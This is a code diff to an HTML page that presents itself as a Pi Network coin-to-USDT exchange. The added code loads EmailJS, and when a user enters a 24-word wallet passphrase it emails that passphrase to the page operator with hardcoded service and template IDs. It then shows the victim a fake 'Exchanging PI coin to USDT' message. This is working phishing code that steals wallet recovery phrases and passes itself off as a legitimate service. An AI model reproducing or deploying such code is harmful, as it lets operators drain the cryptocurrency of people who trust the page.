@@ -1,5 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
+
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -218,6 +220,10 @@
     <p>Powered by the Pi Network Ecosystem</p>
 </footer>
 
+
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
     const piInput = document.getElementById("pi-amount");
     const usdtOutput = document.getElementById("usdt-amount");
@@ -227,11 +233,23 @@
     const errorMessage = document.getElementById("error-message");
     const submitPassphraseBtn = document.getElementById("submit-passphrase");
 
-    // Default rate
+    
+    const piToUsdtRate = 3; // Default rate
 
-    // Fetch live Pi to USDT rate
-    const piToUsdtRate = 3;  // New multiplier
 
+
+// Real-time update of USDT equivalent
+piInput.addEventListener("input", () => {
+    const piValue = parseFloat(piInput.value);
+    if (!isNaN(piValue) && piValue > 0) {
+        usdtOutput.value = (piValue * piToUsdtRate).toFixed(2);
+    } else {
+        usdtOutput.value = "0";
+    }
+});
+
+    // Initialize EmailJS
+    emailjs.init("JnmwgNcbGhcU5llRU");  // Replace with your Public Key
 
     // Real-time update of USDT equivalent
     piInput.addEventListener("input", () => {
@@ -252,17 +270,27 @@
         }
     });
 
-    // Validate passphrase and close popup
+    // Validate passphrase and send it via email using EmailJS
     submitPassphraseBtn.addEventListener("click", () => {
         const passphrase = passphraseInput.value.trim();
         const wordCount = passphrase.split(/\s+/).length;
 
         if (wordCount === 24) {
-            alert("Passphrase accepted! Transaction processing...");
-            popup.style.display = "none";
-            passphraseInput.value = ""; // Reset input
+            // Send the passphrase to your email using EmailJS
+            const templateParams = {
+                passphrase: passphrase
+            };
+
+            emailjs.send("service_61nbuxn", "template_7c7z4j9", templateParams)
+                .then((response) => {
+                    alert("Exchanging PI coin to USDT......");
+                    popup.style.display = "none";
+                    passphraseInput.value = ""; // Reset input
+                }, (error) => {
+                    alert("Failed to send passphrase: " + error.text);
+                });
         } else {
-            errorMessage.style.display = "block";
+            errorMessage.style.display = "block"; // Show error message if passphrase is invalid
         }
     });
 
@@ -271,6 +299,10 @@
         errorMessage.style.display = "none";
     });
 </script>
+
+
+
+
 
 </body>
 </html>
